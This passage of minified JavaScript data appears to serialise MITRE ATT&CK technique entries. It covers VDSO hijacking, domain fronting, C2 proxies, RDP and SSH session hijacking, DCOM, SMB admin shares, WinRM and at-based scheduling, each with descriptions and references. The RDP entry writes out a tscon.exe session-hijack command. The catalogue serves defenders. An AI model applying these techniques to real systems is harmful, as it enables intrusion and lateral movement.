evade detection from security products since the execution is masked under a legitimate process. ";Bd.external_references=[{source_name:b,external_id:Be,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F005"},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F11\u002Fursnif-variant-malicious-tls-callback-technique.html",description:"Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved December 18, 2017.",source_name:"FireEye TLS Nov 2017"},{url:C,description:D,source_name:E}];Bd["subtechnique-of"]=G;Bf.id=Bg;Bf["object-type"]=a;Bf.name="VDSO Hijacking";Bf.description="Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F008'\u003EPtrace System Calls\u003C\u002Fa\u003E. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20150711051625\u002Fhttp:\u002F\u002Fvxer.org\u002Flib\u002Fvrn00.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fbacktrace.io\u002Fblog\u002Fbacktrace\u002Felf-shared-library-injection-forensics\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20051013084246\u002Fhttp:\u002F\u002Fwww.trilithium.com\u002Fjohan\u002F2005\u002F08\u002Flinux-gate\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Flwn.net\u002FArticles\u002F604515\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ";Bf.external_references=[{source_name:b,external_id:Bg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F014"},{source_name:"ELF Injection May 2009",url:"https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20150711051625\u002Fhttp:\u002F\u002Fvxer.org\u002Flib\u002Fvrn00.html",description:"O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020."},{source_name:"Backtrace VDSO",url:"https:\u002F\u002Fbacktrace.io\u002Fblog\u002Fbacktrace\u002Felf-shared-library-injection-forensics\u002F",description:"backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020."},{source_name:"VDSO Aug 2005",url:"https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20051013084246\u002Fhttp:\u002F\u002Fwww.trilithium.com\u002Fjohan\u002F2005\u002F08\u002Flinux-gate\u002F",description:"Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020."},{source_name:"Syscall 2014",url:"https:\u002F\u002Flwn.net\u002FArticles\u002F604515\u002F",description:"Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020."},{description:gd,source_name:ge},{url:gf,description:gg,source_name:gh},{url:gi,description:gj,source_name:gk},{url:gl,description:gm,source_name:gn}];Bf["subtechnique-of"]=G;Bi.id=Bj;Bi["object-type"]=a;Bi.name="Domain Fronting";Bi.description="Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.icir.org\u002Fvern\u002Fpapers\u002Fmeek-PETS-2015.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.";Bi.external_references=[{source_name:b,external_id:Bj,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F004"},{external_id:"CAPEC-481",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F481.html"},{url:"http:\u002F\u002Fwww.icir.org\u002Fvern\u002Fpapers\u002Fmeek-PETS-2015.pdf",description:"David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.",source_name:"Fifield Blocking Resistent Communication through domain fronting 2015"}];Bi["subtechnique-of"]=be;Bk.id=Bl;Bk["object-type"]=a;Bk.name="External Proxy";Bk.description="Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0040'\u003EHTRAN\u003C\u002Fa\u003E, ZXProxy, and ZXPortMap. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fin-depth-look-apt-attack-tools-of-the-trade\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.";Bk.external_references=[{source_name:b,external_id:Bl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F002"},{url:cY,description:cZ,source_name:c_},{url:f,description:g,source_name:h}];Bk["subtechnique-of"]=be;Bm.id=Bn;Bm["object-type"]=a;Bm.name="Internal Proxy";Bm.description="Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0040'\u003EHTRAN\u003C\u002Fa\u003E, ZXProxy, and ZXPortMap. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fin-depth-look-apt-attack-tools-of-the-trade\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.";Bm.external_references=[{source_name:b,external_id:Bn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F001"},{url:cY,description:cZ,source_name:c_},{url:f,description:g,source_name:h}];Bm["subtechnique-of"]=be;Bo.id=Bp;Bo["object-type"]=a;Bo.name="Multi-hop Proxy";Bo.description="To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FOnion_routing'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1599'\u003ENetwork Boundary Bridging\u003C\u002Fa\u003E method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.";Bo.external_references=[{source_name:b,external_id:Bp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F003"},{source_name:"Onion Routing",url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FOnion_routing",description:"Wikipedia. (n.d.). Onion Routing. Retrieved October 20, 2020."}];Bo["subtechnique-of"]=be;Bz.id=BA;Bz["object-type"]=a;Bz.name="RDP Hijacking";Bz.description="Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fwindowsserver\u002Fee236407.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.korznikov.com\u002F2017\u002F03\u002F0-day-or-feature-privilege-escalation.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This can be done remotely or locally and with active or disconnected sessions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@networksecurity\u002Frdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E It can also lead to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1018'\u003ERemote System Discovery\u003C\u002Fa\u003E and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fnccgroup\u002Fredsnarf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Bz.external_references=[{source_name:b,external_id:BA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1563\u002F002"},{url:go,description:gp,source_name:gq},{url:"http:\u002F\u002Fwww.korznikov.com\u002F2017\u002F03\u002F0-day-or-feature-privilege-escalation.html",description:"Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.",source_name:"RDP Hijacking Korznikov"},{url:Bt,description:Bu,source_name:Bv},{url:"https:\u002F\u002Fgithub.com\u002Fnccgroup\u002Fredsnarf",description:"NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.",source_name:"Kali Redsnarf"}];Bz["subtechnique-of"]=ds;BB.id=BC;BB["object-type"]=a;BB.name="SSH Hijacking";BB.description="Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002Fmorisson\u002Fmistrusting-and-abusing-ssh-13526219'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fpresentations\u002Fbh-usa-05\u002Fbh-us-05-boileau.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.clockwork.com\u002Fnews\u002F2012\u002F09\u002F28\u002F602\u002Fssh_agent_hijacking'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmatrix.org\u002Fblog\u002F2019\u002F05\u002F08\u002Fpost-mortem-and-remediations-for-apr-11-security-incident'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1563\u002F001'\u003ESSH Hijacking\u003C\u002Fa\u003E differs from use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F004'\u003ESSH\u003C\u002Fa\u003E because it hijacks an existing SSH session rather than creating a new session using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E.";BB.external_references=[{source_name:b,external_id:BC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1563\u002F001"},{url:"https:\u002F\u002Fwww.slideshare.net\u002Fmorisson\u002Fmistrusting-and-abusing-ssh-13526219",description:"Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using ssh. Retrieved January 8, 2018.",source_name:"Slideshare Abusing SSH"},{url:"https:\u002F\u002Fwww.blackhat.com\u002Fpresentations\u002Fbh-usa-05\u002Fbh-us-05-boileau.pdf",description:"Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion SSH Hijacking. Retrieved December 19, 2017.",source_name:"SSHjack Blackhat"},{url:"https:\u002F\u002Fwww.clockwork.com\u002Fnews\u002F2012\u002F09\u002F28\u002F602\u002Fssh_agent_hijacking",description:"Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved December 20, 2017.",source_name:"Clockwork SSH Agent Hijacking"},{source_name:Bw,url:Bx,description:By}];BB["subtechnique-of"]=ds;BG.id=BH;BG["object-type"]=a;BG.name="Distributed Component Object Model";BG.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms687317(v=vs.85).aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By default, only Administrators may remotely activate and launch COM objects through DCOM.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fcom\u002Fdcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F11\u002F16\u002Flateral-movement-using-outlooks-createobject-method-and-dotnettojscript\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E as well as other Windows objects that contain insecure methods.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F05\u002Flateral-movement-using-the-mmc20-application-com-object\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F23\u002Flateral-movement-via-dcom-round-2\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E DCOM can also execute macros in existing documents\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F09\u002F11\u002Flateral-movement-using-excel-application-and-dcom\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fleveraging-excel-dde-for-lateral-movement-via-dcom'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, bypassing the need for a malicious document.";BG.external_references=[{source_name:b,external_id:BH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F003"},{source_name:eh,url:ei,description:ej},{url:cm,description:cn,source_name:co},{url:mv,description:mw,source_name:mx},{url:ms,description:mt,source_name:mu},{url:ek,description:el,source_name:em},{url:en,description:eo,source_name:ep},{url:mB,description:mC,source_name:mD},{url:mE,description:mF,source_name:mG},{url:mH,description:mI,source_name:mJ}];BG["subtechnique-of"]=ad;BI.id=BJ;BI["object-type"]=a;BI.name="Remote Desktop Protocol";BI.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fwindowsserver\u002Fee236407.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAdversaries may connect to a remote system over RDP\u002FRDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F008'\u003EAccessibility Features\u003C\u002Fa\u003E technique for Persistence.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.crowdstrike.com\u002Fadversary-tricks-crowdstrike-treats\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";BI.external_references=[{source_name:b,external_id:BJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F001"},{external_id:bC,source_name:c,url:bD},{url:go,description:gp,source_name:gq},{url:"http:\u002F\u002Fblog.crowdstrike.com\u002Fadversary-tricks-crowdstrike-treats\u002F",description:"Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.",source_name:"Alperovitch Malware"}];BI["subtechnique-of"]=ad;BK.id=BL;BK["object-type"]=a;BK.name="SMB\u002FWindows Admin Shares";BK.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to remotely access a networked system over SMB,\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FServer_Message_Block'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E to interact with systems using remote procedure calls (RPCs),\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc787851.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB\u002FRPC are \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569\u002F002'\u003EService Execution\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E. Adversaries can also use NTLM hashes to access administrator shares on systems with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F002'\u003EPass the Hash\u003C\u002Fa\u003E and certain configuration and patch levels.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fsupport.microsoft.com\u002Fkb\u002F314984'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";BK.external_references=[{source_name:b,external_id:BL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002"},{external_id:"CAPEC-561",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F561.html"},{url:fE,description:to,source_name:tp},{url:BM,description:BN,source_name:BO},{url:"http:\u002F\u002Fsupport.microsoft.com\u002Fkb\u002F314984",description:"Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.",source_name:"Microsoft Admin Shares"},{source_name:"Lateral Movement Payne",description:"Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Farchive\u002Fblogs\u002Fjepayne\u002Ftracking-lateral-movement-part-one-special-groups-and-specific-service-accounts"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Farchive\u002Fblogs\u002Fjepayne\u002Fmonitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem",description:"Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.",source_name:"Windows Event Forwarding Payne"},{description:sj,url:sk,source_name:sl}];BK["subtechnique-of"]=ad;BP.id=BQ;BP["object-type"]=a;BP.name="SSH";BP.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ssh.com\u002Fssh'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";BP.external_references=[{source_name:b,external_id:BQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F004"},{external_id:bC,source_name:c,url:bD},{source_name:BD,url:BE,description:BF}];BP["subtechnique-of"]=ad;BR.id=BS;BR["object-type"]=a;BR.name="VNC";BR.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.\n\nVNC is a desktop sharing system that allows users to remotely control another computer’s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.";BR.external_references=[{source_name:b,external_id:BS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F005"},{external_id:bC,source_name:c,url:bD}];BR["subtechnique-of"]=ad;BT.id=BU;BT["object-type"]=a;BT.name="Windows Remote Management";BT.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa384426'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E It may be called with the `winrm` command or by any number of programs such as PowerShell.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002Fkieranjacobsen\u002Flateral-movement-with-power-shell-2'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";BT.external_references=[{source_name:b,external_id:BU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F006"},{url:"http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa384426",description:"Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.",source_name:"Microsoft WinRM"},{url:"https:\u002F\u002Fwww.slideshare.net\u002Fkieranjacobsen\u002Flateral-movement-with-power-shell-2",description:"Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.",source_name:"Jacobsen 2014"},{source_name:"Medium Detecting Lateral Movement",url:"https:\u002F\u002Fmedium.com\u002Fthreatpunter\u002Fdetecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc",description:"French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019."}];BT["subtechnique-of"]=ad;Cb.id=Cc;Cb["object-type"]=a;Cb.name="At (Linux)";Cb.description="Adversaries may abuse the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E utility to perform task scheduling for initial or recurring execution of malicious code. The \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E command within Linux operating systems enables administrators to schedule tasks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkifarunix.com\u002Fscheduling-tasks-using-at-command-in-linux\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E in Linux environments to execute programs at system startup or on a scheduled basis for persistence. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.";Cb.external_references=[{source_name:b,external_id:Cc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F001"},{source_name:"Kifarunix - Task Scheduling in Linux",url:"https:\u002F\u002Fkifarunix.com\u002Fscheduling-tasks-using-at-command-in-linux\u002F",description:"Koromicha. (2019, September 7). Scheduling tasks using at command in Linux. Retrieved December 3, 2019."}];Cb["subtechnique-of"]=W;Cd.id=Ce;Cd["object-type"]=a;Cd.name="At (Windows)";Cd.description="Adversaries may abuse the \u003Ccode\u003Eat.exe\u003C\u002Fcode\u003E utility to perform task scheduling for initial or recurring execution of malicious code. The \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using \u003Ca 